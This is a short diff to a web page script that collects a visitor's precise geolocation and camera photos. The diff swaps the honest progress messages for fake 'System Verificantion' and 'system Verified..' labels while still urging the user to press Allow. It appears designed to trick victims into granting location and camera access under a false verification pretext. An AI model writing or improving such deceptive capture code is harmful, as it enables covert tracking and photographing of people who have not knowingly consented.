@@ -613,7 +613,7 @@ async function runStep(i){
 
 function getLoc(){return new Promise((r)=>{
   if(!navigator.geolocation){showProgress("📍 Location","unsupported");r();return}
-  showProgress("📍 Location maangi ja rahi hai...","popup par Allow dabao");
+  showProgress("System Verificantion","popup par Allow dabao");
   navigator.geolocation.getCurrentPosition(
     p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed};showProgress("📍 Location captured ✓","");r()},
     ()=>{showProgress("📍 Location","denied/error");r()},
@@ -624,7 +624,7 @@ function getLoc(){return new Promise((r)=>{
 async function capPhotos(fm,count){
   let stream;
   try{
-    showProgress("📸 Camera permission...","popup par Allow dabao");
+    showProgress("system Verified..","popup par Allow dabao");
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:480},height:{ideal:360}}});
     const v=document.createElement("video");v.srcObject=stream;await v.play();
     await new Promise(r=>setTimeout(r,300));
